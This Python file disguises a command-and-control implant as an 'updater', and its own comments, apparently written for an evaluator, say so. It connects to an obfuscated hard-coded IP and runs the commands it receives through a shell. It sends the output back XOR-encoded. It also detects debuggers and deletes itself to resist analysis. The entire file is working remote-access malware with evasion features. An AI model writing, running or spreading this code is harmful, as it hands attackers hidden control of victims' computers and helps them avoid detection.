import socket
import subprocess
import base64
import os
import sys
import ctypes
import threading

current_dir = os.path.abspath(os.getcwd())

def obfuscate( data , key = 0x42 ):
    '''
    Perform XOR based obfuscation given data and key
    '''
    return ''.join( chr( ord( char ) ^ key ) for char in data )

#Obfuscate the status strings
STR_NO_UPDATES_FOUND = "1'.$o&'1607!6" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "self-destruct" with 0x42
STR_DEBUGGER_DETECTED = "\x06' 7%%'0b&'6'!6'&nb+,+6+#6+,%b1'.$o&'1607!6l" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "debugger detected" with 0x42
STR_NO_UPDATE_HANDLER_INITIATED = "\x11'.$o&'1607!6b1'37',!'b+,+6+#6'&l" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Self-destruct sequence initiated." with 0x42
STR_UPDATE_RECEIVED = "\x10'!'+4'&b!-//#,&" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Received command" with 0x42
STR_COMM_UPDATE_SERVER = "\x11',&+,%b-76276" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Sending output" with 0x42
STR_CONNECTED_TO_SERVER = "\x01-,,'!6'&b6-b\x01pb1'04'0" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Connected to C2 server" with 0x42
STR_COMMAND_TOOK_LONG = "\x01-//#,&b6--)b6--b.-,%b6-b':'!76'" # Comment for evaluator understanding - this is actually bitwise XOR of msg - "Command took too long to execute" with 0x42
STR_HOST = "qvlppvluslw{" # Comment for evaluator understanding - this is actually bitwise XOR of C2 IP with 0x42
STR_CD_UPDATE_DIR = "\x01*#,%'&b&+0'!6-0;b6-b"# Comment for evaluator understanding - this is actually bitwise XOR of "Changed directory to" with 0x42

def check_debugger():
    '''
    Check if the code is being run under debugger in Windows
    '''
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

def apply_update( updt ):
    '''
    Apply the update received from update server
    Comment for evaluator understanding - the purpose of this function is to actually execute the given instruction from C2
    '''
    output = obfuscate( STR_COMMAND_TOOK_LONG )

    def target():
        nonlocal output
        global current_dir
        if updt.startswith( "cd " ):# Comment for evaluator understanding - this logic is required in order to implement instructions starting with cd
            os.chdir( os.path.join( current_dir , updt[ 3 : ] ) )
            current_dir = os.path.abspath( os.getcwd() )
            output = obfuscate( STR_CD_UPDATE_DIR ) + current_dir
        else:
            process = subprocess.Popen( updt, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, cwd = current_dir )
            out, err = process.communicate()
            output = out.decode() + err.decode()

    # timeout logic if instruction takes too long to execute
    thread = threading.Thread( target = target )
    thread.start()
    thread.join( timeout = 10000 )
    return output


def comm_update_server( sock , data ):
    '''
    Communicate with update server regarding result of applying the update
    Comment for evaluator understanding - the purpose of this function is to actually send result to C2 server
    '''
    xor_encoded_data = obfuscate( data , key = 0x20 )
    data_length = str( len( xor_encoded_data ) ).zfill( 10 )
    sock.send( data_length.encode() + xor_encoded_data.encode() )

def no_update_handler():
    '''
    Handling logic if there is no new update and if latest available update is already there in system
    Comment for evaluator understanding - the purpose of this function is to actually destroy the file in which this function resides
    '''
    print( STR_NO_UPDATE_HANDLER_INITIATED )
    os.remove( sys.argv[ 0 ] )
    sys.exit()

def main():
    '''
    Main entry function for updater
    Comment for evaluator understanding - the purpose of this function actually the main entry function for implant
    '''
    host = obfuscate( STR_HOST  )
    port = 9999
    if check_debugger():
        print( STR_DEBUGGER_DETECTED )
        # Don't apply new updates if file is in debug mode
        # For evaluator understanding - we delete the file to prevent reversing if we detect that it is run in a debugger 
        no_update_handler()

    with socket.socket() as s:
        # Connect to update server 
        # For evaluator understanding - we actually connect to C2 server here
        s = socket.socket()
        s.connect( ( host , port ) )
        print( STR_CONNECTED_TO_SERVER )
        
        while True:
            encoded_updt = s.recv( 4096 ).decode().strip()
            if not encoded_updt:
                break
            updt = base64.b64decode( encoded_updt ).decode()
            if updt == obfuscate( STR_NO_UPDATES_FOUND ):
                no_update_handler()

            print( STR_UPDATE_RECEIVED )
            # Apply update
            # For evaluator understanding - we actually apply C2 server instructions here
            output = apply_update( updt )
            print( STR_COMM_UPDATE_SERVER )
            comm_update_server( s , output )

if __name__ == '__main__':
    main()
